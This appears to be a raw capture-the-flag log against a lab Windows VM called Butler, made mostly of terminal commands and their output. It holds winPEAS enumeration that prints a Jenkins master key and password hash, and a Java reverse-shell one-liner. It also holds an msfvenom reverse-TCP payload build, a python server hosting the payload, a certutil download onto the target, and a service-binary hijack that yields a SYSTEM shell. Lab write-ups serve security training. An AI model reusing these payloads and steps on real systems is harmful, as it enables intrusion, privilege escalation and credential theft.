     File Permissions "C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\python3.7.exe": Administrators [AllAccess]                                                                                                                                                                      
     File Permissions "C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\python.exe": Administrators [AllAccess]
     File Permissions "C:\Users\Public\Downloads\winpeas.exe": Administrators [AllAccess],Service [WriteData/CreateFiles]
     File Permissions "C:\Users\All Users\VMware\VMware CAF\pme\data\input\invokers\cafTestInfra_CafTestInfraProvider_1_0_0.bat": Administrators [AllAccess]
     File Permissions "C:\Users\All Users\VMware\VMware CAF\pme\data\input\invokers\caf_ConfigProvider_1_0_0.bat": Administrators [AllAccess]
     File Permissions "C:\Users\All Users\VMware\VMware CAF\pme\data\input\invokers\caf_InstallProvider_1_0_0.bat": Administrators [AllAccess]
     File Permissions "C:\Users\All Users\VMware\VMware CAF\pme\data\input\invokers\caf_RemoteCommandProvider_1_0_0.bat": Administrators [AllAccess]
     File Permissions "C:\Users\All Users\VMware\VMware CAF\pme\data\input\installProviderHeader.bat": Administrators [AllAccess]
     File Permissions "C:\Users\All Users\VMware\VMware CAF\pme\install\caf-dbg.ps1": Administrators [AllAccess]
     File Permissions "C:\Users\All Users\VMware\VMware CAF\pme\install\postInstall.bat": Administrators [AllAccess]
     File Permissions "C:\Users\All Users\VMware\VMware CAF\pme\install\preconfigure-listener.bat": Administrators [AllAccess]
     File Permissions "C:\Users\All Users\VMware\VMware CAF\pme\scripts\is-listener-running.bat": Administrators [AllAccess]
     File Permissions "C:\Users\All Users\VMware\VMware CAF\pme\scripts\is-ma-running.bat": Administrators [AllAccess]
     File Permissions "C:\Users\All Users\VMware\VMware CAF\pme\scripts\setUpVgAuth.bat": Administrators [AllAccess]
     File Permissions "C:\Users\All Users\VMware\VMware CAF\pme\scripts\start-listener.bat": Administrators [AllAccess]
     File Permissions "C:\Users\All Users\VMware\VMware CAF\pme\scripts\start-ma.bat": Administrators [AllAccess]
     File Permissions "C:\Users\All Users\VMware\VMware CAF\pme\scripts\start-VGAuthService.bat": Administrators [AllAccess]
     File Permissions "C:\Users\All Users\VMware\VMware CAF\pme\scripts\stop-listener.bat": Administrators [AllAccess]
     File Permissions "C:\Users\All Users\VMware\VMware CAF\pme\scripts\stop-ma.bat": Administrators [AllAccess]
     File Permissions "C:\Users\All Users\VMware\VMware CAF\pme\scripts\stop-VGAuthService.bat": Administrators [AllAccess]
     File Permissions "C:\Users\All Users\VMware\VMware CAF\pme\scripts\tearDownVgAuth.bat": Administrators [AllAccess]
     File Permissions "C:\Users\All Users\VMware\VMware CAF\pme\scripts\vgAuth.bat": Administrators [AllAccess]
     File Permissions "C:\Users\butler\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe": Administrators [AllAccess],butler [AllAccess]
     File Permissions "C:\Users\butler\AppData\Local\Microsoft\OneDrive\OneDrive.exe": Administrators [AllAccess],butler [AllAccess]
     File Permissions "C:\Users\butler\AppData\Local\Microsoft\WindowsApps\python3.exe": Administrators [AllAccess],butler [AllAccess]
     File Permissions "C:\Users\butler\AppData\Local\Microsoft\WindowsApps\python.exe": Administrators [AllAccess],butler [AllAccess]
     File Permissions "C:\Users\butler\AppData\Local\Microsoft\WindowsApps\MicrosoftEdge.exe": Administrators [AllAccess],butler [AllAccess]
     File Permissions "C:\Users\butler\AppData\Local\Microsoft\WindowsApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdge.exe": Administrators [AllAccess],butler [AllAccess]
     File Permissions "C:\Users\butler\AppData\Local\Microsoft\WindowsApps\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\python3.exe": Administrators [AllAccess],butler [AllAccess]
     File Permissions "C:\Users\butler\AppData\Local\Microsoft\WindowsApps\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\python3.7.exe": Administrators [AllAccess],butler [AllAccess]
     File Permissions "C:\Users\butler\AppData\Local\Microsoft\WindowsApps\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\python.exe": Administrators [AllAccess],butler [AllAccess]

����������͹ Looking for Linux shells/distributions - wsl.exe, bash.exe


�����������������������������������͹ File Analysis �������������������������������������

����������͹ Found Ldap Files

����������͹ Found CERTSB4 Files
File: C:\Users\All Users\VMware\VMware Tools\GuestProxyData\server\key.pem
File: C:\Users\All Users\VMware\VMware Tools\GuestProxyData\server\cert.pem
File: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_18.1903.1152.0_x64__8wekyb3d8bbwe\localhost.crt

����������͹ Found CERTSBIN Files
File: C:\Users\Administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalState\dtlskey.der
File: C:\Users\Administrator\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalState\dtlscert.der
File: C:\Users\butler\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalState\dtlskey.der
File: C:\Users\butler\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalState\dtlscert.der

����������͹ Found SSH AGENTS Files
File: C:\Program Files\Java\jre1.8.0_301\bin\ssvagent.exe
File: C:\Program Files\Java\jre1.8.0_301\lib\management-agent.jar
File: C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\ManagementAgentHost.exe.manifest
File: C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\ManagementAgentHost.exe

����������͹ Found Jenkins Files
File: C:\Users\butler\AppData\Local\Jenkins\.jenkins\secrets\master.key
ca2fb387a0adae805c2d18b2778a2a1c8e148acf99dd31bd4886939060deb382ff27971dab17d92ea1588300a6a0dfef77338dd3c3d1f7bd9ae7fe875b80af6d40e68f23bc50406805f981e5e3693ea9d5c5d2d0b6e9193855e2aded2a2a6abc0bebe462798e0eb1fee0a998f6718276b748d7e85eab08cb8ffda9a07ecc8eaa                                                                              

File: C:\Users\butler\AppData\Local\Jenkins\.jenkins\users\jenkins_5638981406360755566\config.xml
      <passwordHash>#jbcrypt:$2a$10$MPpqVmtaCTVUTB8wqHeGquT5VeNEsvwj4qe1yBfaU/6uSwbbve0QO</passwordHash>

File: C:\Users\butler\AppData\Local\Jenkins\.jenkins\config.xml

����������͹ Found Windows Files
File: C:\Users\butler\AppData\Local\Jenkins\war\scripts\yui\assets\skins\sam
File: C:\Users\butler\AppData\Local\Jenkins\war\scripts\yui\autocomplete\assets\skins\sam
File: C:\Users\butler\AppData\Local\Jenkins\war\scripts\yui\button\assets\skins\sam
File: C:\Users\butler\AppData\Local\Jenkins\war\scripts\yui\container\assets\skins\sam
File: C:\Users\butler\AppData\Local\Jenkins\war\scripts\yui\editor\assets\skins\sam
File: C:\Users\butler\AppData\Local\Jenkins\war\scripts\yui\logger\assets\skins\sam
File: C:\Users\butler\AppData\Local\Jenkins\war\scripts\yui\menu\assets\skins\sam
File: C:\Users\butler\AppData\Local\Jenkins\war\scripts\yui\resize\assets\skins\sam
File: C:\Users\butler\AppData\Local\Jenkins\war\scripts\yui\tabview\assets\skins\sam
File: C:\Users\butler\AppData\Local\Jenkins\war\scripts\yui\treeview\assets\skins\sam
File: C:\Users\All Users\USOShared\Logs\System
File: C:\Program Files\Common Files\System
File: C:\Program Files (x86)\Common Files\System
File: C:\Users\Administrator\NTUSER.DAT
File: C:\Users\butler\NTUSER.DAT
File: C:\Users\Default\NTUSER.DAT

����������͹ Found Other Windows Files
File: C:\Program Files\Java\jre1.8.0_301\lib\security
File: C:\Users\All Users\USOShared\Logs\System
File: C:\Program Files\Common Files\System
File: C:\Program Files (x86)\Common Files\System

����������͹ Found Database Files
File: C:\Users\Administrator\AppData\Local\ConnectedDevicesPlatform\L.Administrator\ActivitiesCache.db
File: C:\Users\Administrator\AppData\Local\Microsoft\Windows\Caches\cversions.1.db
File: C:\Users\Administrator\AppData\Local\Microsoft\Windows\Caches\cversions.3.db
File: C:\Users\Administrator\AppData\Local\Microsoft\Windows\Caches\{0BDE7B0F-B905-4D30-88C9-B63C603DA134}.3.ver0x0000000000000001.db
File: C:\Users\Administrator\AppData\Local\Microsoft\Windows\Caches\{3DA71D5A-20CC-432F-A115-DFE92379E91F}.3.ver0x0000000000000010.db
File: C:\Users\Administrator\AppData\Local\Microsoft\Windows\Caches\{AFBF9F1A-8EE8-4C77-AF34-C647E37CA0D9}.1.ver0x0000000000000002.db
File: C:\Users\Administrator\AppData\Local\Microsoft\Windows\Caches\{AFBF9F1A-8EE8-4C77-AF34-C647E37CA0D9}.1.ver0x0000000000000003.db

����������͹ Found Password Files Files
File: C:\Users\butler\AppData\Roaming\Microsoft\Windows\Recent\initialAdminPassword.lnk
File: C:\Program Files\Java\jre1.8.0_301\lib\management\jmxremote.password.template
File: C:\Users\Administrator\AppData\Local\Microsoft\Credentials
File: C:\Users\butler\AppData\Local\Jenkins\.jenkins\plugins\ssh-credentials.jpi
File: C:\Users\butler\AppData\Local\Jenkins\.jenkins\plugins\plain-credentials.jpi
File: C:\Users\butler\AppData\Local\Jenkins\.jenkins\plugins\credentials.jpi
File: C:\Users\butler\AppData\Local\Jenkins\.jenkins\plugins\credentials-binding.jpi
File: C:\Users\butler\AppData\Local\Jenkins\.jenkins\plugins\ssh-credentials\META-INF\maven\org.jenkins-ci.plugins\ssh-credentials
File: C:\Users\butler\AppData\Local\Jenkins\.jenkins\plugins\ssh-credentials\WEB-INF\lib\ssh-credentials.jar
File: C:\Users\butler\AppData\Local\Jenkins\.jenkins\plugins\ssh-credentials
File: C:\Users\butler\AppData\Local\Jenkins\.jenkins\plugins\plain-credentials\META-INF\maven\org.jenkins-ci.plugins\plain-credentials
File: C:\Users\butler\AppData\Local\Jenkins\.jenkins\plugins\plain-credentials\WEB-INF\lib\plain-credentials.jar
File: C:\Users\butler\AppData\Local\Jenkins\.jenkins\plugins\plain-credentials
File: C:\Users\butler\AppData\Local\Jenkins\.jenkins\plugins\credentials-binding\META-INF\maven\org.jenkins-ci.plugins\credentials-binding
File: C:\Users\butler\AppData\Local\Jenkins\.jenkins\plugins\credentials-binding\WEB-INF\lib\credentials-binding.jar
File: C:\Users\butler\AppData\Local\Jenkins\.jenkins\plugins\credentials-binding
File: C:\Users\butler\AppData\Local\Jenkins\.jenkins\plugins\credentials\META-INF\maven\org.jenkins-ci.plugins\credentials
File: C:\Users\butler\AppData\Local\Jenkins\.jenkins\plugins\credentials\WEB-INF\lib\credentials.jar
File: C:\Users\butler\AppData\Local\Jenkins\.jenkins\plugins\credentials
File: C:\Users\butler\AppData\Local\Microsoft\Credentials
File: C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
File: C:\Users\butler\AppData\Local\Jenkins\.jenkins\secrets\org.jenkinsci.main.modules.instance_identity.InstanceIdentity.KEY
File: C:\Users\butler\AppData\Local\Jenkins\.jenkins\secrets\master.key
File: C:\Users\butler\AppData\Local\Jenkins\.jenkins\secret.key
[----------]   5% /
7% |^C
                                                                                                                                                                       
┌──(alpha㉿sploit)-[~/butler]
└─$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [192.168.1.19] from (UNKNOWN) [192.168.1.20] 50058
Microsoft Windows [Version 10.0.19043.928]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files\Jenkins>cd c:/
cd c:/

c:\>cd "program files (x86)"
cd "program files (x86)"

c:\Program Files (x86)>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 1067-CB24

 Directory of c:\Program Files (x86)

08/14/2021  05:34 AM    <DIR>          .
08/14/2021  05:34 AM    <DIR>          ..
08/14/2021  05:05 AM    <DIR>          Common Files
12/07/2019  02:49 AM    <DIR>          Internet Explorer
08/14/2021  04:43 AM    <DIR>          Microsoft
12/07/2019  02:31 AM    <DIR>          Microsoft.NET
04/09/2021  06:55 AM    <DIR>          Windows Defender
04/09/2021  06:55 AM    <DIR>          Windows Mail
04/09/2021  06:55 AM    <DIR>          Windows Media Player
12/07/2019  02:52 AM    <DIR>          Windows Multimedia Platform
12/07/2019  02:49 AM    <DIR>          Windows NT
04/09/2021  06:55 AM    <DIR>          Windows Photo Viewer
12/07/2019  02:52 AM    <DIR>          Windows Portable Devices
12/07/2019  02:31 AM    <DIR>          WindowsPowerShell
08/14/2021  06:28 AM    <DIR>          Wise
               0 File(s)              0 bytes
              15 Dir(s)  13,010,882,560 bytes free

c:\Program Files (x86)>cd wise
cd wise

c:\Program Files (x86)\Wise>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 1067-CB24

 Directory of c:\Program Files (x86)\Wise

08/14/2021  06:28 AM    <DIR>          .
08/14/2021  06:28 AM    <DIR>          ..
08/14/2021  05:34 AM    <DIR>          Wise Care 365
               0 File(s)              0 bytes
               3 Dir(s)  13,006,688,256 bytes free

c:\Program Files (x86)\Wise>certutil.exe -urlcache http://192.168.19:444/wise.exe wise.exe
certutil.exe -urlcache http://192.168.19:444/wise.exe wise.exe


****  OFFLINE  ****


CertUtil: -URLCache command completed successfully.

c:\Program Files (x86)\Wise>wise.exe
wise.exe
'wise.exe' is not recognized as an internal or external command,
operable program or batch file.

c:\Program Files (x86)\Wise>ls
ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

c:\Program Files (x86)\Wise>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 1067-CB24

 Directory of c:\Program Files (x86)\Wise

08/14/2021  06:28 AM    <DIR>          .
08/14/2021  06:28 AM    <DIR>          ..
08/14/2021  05:34 AM    <DIR>          Wise Care 365
               0 File(s)              0 bytes
               3 Dir(s)  12,998,131,712 bytes free

c:\Program Files (x86)\Wise>certutil.exe -urlcache http://192.168.19:444/wise.exe wise.exe
certutil.exe -urlcache http://192.168.19:444/wise.exe wise.exe


****  OFFLINE  ****


CertUtil: -URLCache command completed successfully.

c:\Program Files (x86)\Wise>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 1067-CB24

 Directory of c:\Program Files (x86)\Wise

08/14/2021  06:28 AM    <DIR>          .
08/14/2021  06:28 AM    <DIR>          ..
08/14/2021  05:34 AM    <DIR>          Wise Care 365
               0 File(s)              0 bytes
               3 Dir(s)  12,998,070,272 bytes free

c:\Program Files (x86)\Wise>certutil -urlcache -f http://192.168.1.19/wise.exe wise.exe
certutil -urlcache -f http://192.168.1.19/wise.exe wise.exe
****  Online  ****


CertUtil: -URLCache command FAILED: 0x80072efd (WinHttp: 12029 ERROR_WINHTTP_CANNOT_CONNECT)
CertUtil: A connection with the server could not be established

c:\Program Files (x86)\Wise>certutil -urlcache -f http://192.168.1.19:444/wise.exe wise.exe
certutil -urlcache -f http://192.168.1.19:444/wise.exe wise.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

c:\Program Files (x86)\Wise>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 1067-CB24

 Directory of c:\Program Files (x86)\Wise

10/19/2023  05:27 AM    <DIR>          .
10/19/2023  05:27 AM    <DIR>          ..
08/14/2021  05:34 AM    <DIR>          Wise Care 365
10/19/2023  05:27 AM             7,168 wise.exe
               1 File(s)          7,168 bytes
               3 Dir(s)  12,993,384,448 bytes free

c:\Program Files (x86)\Wise>sc stop wiseBootAssistant
sc stop wiseBootAssistant

SERVICE_NAME: wiseBootAssistant 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 3  STOP_PENDING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x3
        WAIT_HINT          : 0x1388

c:\Program Files (x86)\Wise>sc query wiseBootAssistant
sc query wiseBootAssistant

SERVICE_NAME: wiseBootAssistant 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 1  STOPPED 
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

c:\Program Files (x86)\Wise>sc start wiseBootAssistant
sc start wiseBootAssistant
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.


c:\Program Files (x86)\Wise>

c:\Program Files (x86)\Wise>
~~~

[](images/grocy-reverse-shell.png)
~~~
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
~~~
[](https://github.com/carlospolop/PEASS-ng/releases/tag/20231015-0ad0e48c)

~~~
┌──(alpha㉿sploit)-[~/butler]
└─$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [192.168.1.19] from (UNKNOWN) [192.168.1.20] 50058
Microsoft Windows [Version 10.0.19043.928]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files\Jenkins>cd c:/
cd c:/

c:\>cd "program files (x86)"
cd "program files (x86)"

c:\Program Files (x86)>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 1067-CB24

 Directory of c:\Program Files (x86)

08/14/2021  05:34 AM    <DIR>          .
08/14/2021  05:34 AM    <DIR>          ..
08/14/2021  05:05 AM    <DIR>          Common Files
12/07/2019  02:49 AM    <DIR>          Internet Explorer
08/14/2021  04:43 AM    <DIR>          Microsoft
12/07/2019  02:31 AM    <DIR>          Microsoft.NET
04/09/2021  06:55 AM    <DIR>          Windows Defender
04/09/2021  06:55 AM    <DIR>          Windows Mail
04/09/2021  06:55 AM    <DIR>          Windows Media Player
12/07/2019  02:52 AM    <DIR>          Windows Multimedia Platform
12/07/2019  02:49 AM    <DIR>          Windows NT
04/09/2021  06:55 AM    <DIR>          Windows Photo Viewer
12/07/2019  02:52 AM    <DIR>          Windows Portable Devices
12/07/2019  02:31 AM    <DIR>          WindowsPowerShell
08/14/2021  06:28 AM    <DIR>          Wise
               0 File(s)              0 bytes
              15 Dir(s)  13,010,882,560 bytes free

c:\Program Files (x86)>cd wise
cd wise

c:\Program Files (x86)\Wise>
~~~
# meterprer
~~~
┌──(alpha㉿sploit)-[~/Downloads]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.19 LPORT=7777 -f exe > wise.exe                                      
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
~~~
# share malware using python
~~~
┌──(alpha㉿sploit)-[~/Downloads]
└─$ python -m http.server 444
Serving HTTP on 0.0.0.0 port 444 (http://0.0.0.0:444/) ...
192.168.1.20 - - [19/Oct/2023 19:27:29] "GET /wise.exe HTTP/1.1" 200 -
192.168.1.20 - - [19/Oct/2023 19:27:29] "GET /wise.exe HTTP/1.1" 200 -
~~~
# stopwise
~~~

c:\Program Files (x86)\Wise>certutil -urlcache -f http://192.168.1.19:444/wise.exe wise.exe
certutil -urlcache -f http://192.168.1.19:444/wise.exe wise.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

c:\Program Files (x86)\Wise>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 1067-CB24

 Directory of c:\Program Files (x86)\Wise

10/19/2023  05:27 AM    <DIR>          .
10/19/2023  05:27 AM    <DIR>          ..
08/14/2021  05:34 AM    <DIR>          Wise Care 365
10/19/2023  05:27 AM             7,168 wise.exe
               1 File(s)          7,168 bytes
               3 Dir(s)  12,993,384,448 bytes free

c:\Program Files (x86)\Wise>sc stop wiseBootAssistant
sc stop wiseBootAssistant

SERVICE_NAME: wiseBootAssistant 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 3  STOP_PENDING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x3
        WAIT_HINT          : 0x1388

c:\Program Files (x86)\Wise>sc query wiseBootAssistant
sc query wiseBootAssistant

SERVICE_NAME: wiseBootAssistant 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 1  STOPPED 
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

c:\Program Files (x86)\Wise>sc start wiseBootAssistant
sc start wiseBootAssistant
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.


c:\Program Files (x86)\Wise>

c:\Program Files (x86)\Wise>
~~~
# roooot
~~~
┌──(alpha㉿sploit)-[~]
└─$ nc -nlvp 7777
listening on [any] 7777 ...
connect to [192.168.1.19] from (UNKNOWN) [192.168.1.20] 50081
Microsoft Windows [Version 10.0.19043.928]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>systeminfo
systeminfo


Host Name:                 BUTLER
OS Name:                   Microsoft Windows 10 Enterprise Evaluation
OS Version:                10.0.19043 N/A Build 19043
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          butler
Registered Organization:   
Product ID:                00329-20000-00001-AA079
Original Install Date:     8/14/2021, 3:51:38 AM
System Boot Time:          10/19/2023, 4:38:02 AM
System Manufacturer:       innotek GmbH
System Model:              VirtualBox
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 69 Stepping 1 GenuineIntel ~2295 Mhz
BIOS Version:              innotek GmbH VirtualBox, 12/1/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     2,032 MB
Available Physical Memory: 803 MB
Virtual Memory: Max Size:  3,184 MB
Virtual Memory: Available: 1,576 MB
Virtual Memory: In Use:    1,608 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 4 Hotfix(s) Installed.
                           [01]: KB4601554
                           [02]: KB5000736
                           [03]: KB5001330
                           [04]: KB5001405
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Desktop Adapter
                                 Connection Name: Ethernet
                                 DHCP Enabled:    Yes
                                 DHCP Server:     192.168.1.1
                                 IP address(es)
                                 [01]: 192.168.1.20
                                 [02]: fe80::4cc:3ba3:70a5:f5f4
                                 [03]: fd00:5a13:793:1e00:413:7c74:2659:8a4a
                                 [04]: fd00:5a13:793:1e00:4cc:3ba3:70a5:f5f4
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

C:\Windows\system32>
C:\Windows\system32>
~~~
